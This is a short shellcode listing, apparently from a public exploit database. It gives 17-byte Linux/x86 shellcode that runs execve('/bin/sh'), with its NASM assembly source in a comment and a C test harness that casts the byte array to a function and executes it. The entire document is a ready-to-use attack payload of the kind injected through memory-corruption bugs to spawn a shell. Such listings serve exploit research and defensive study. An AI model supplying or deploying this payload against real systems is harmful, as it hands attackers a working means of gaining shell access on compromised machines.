# Linux/x86 - execve(/bin/sh) Shellcode (17 bytes)
# Author: s1ege
# Tested on: i686 GNU/Linux
# Shellcode length: 17

/*
; nasm -felf32 shellcode.asm && ld -melf_i386 shellcode.o -o shellcode
section .text
global _start
_start:
push 0x0b
pop eax
push 0x0068732f
push 0x6e69622f
mov ebx, esp
int 0x80
*/

#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x6a\x0b\x58\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";

int main() {
printf("Shellcode Length: %lu\n", sizeof(code)-1); // subtract null byte
int (*ret)() = (int(*)())code;
ret();
return 0;
}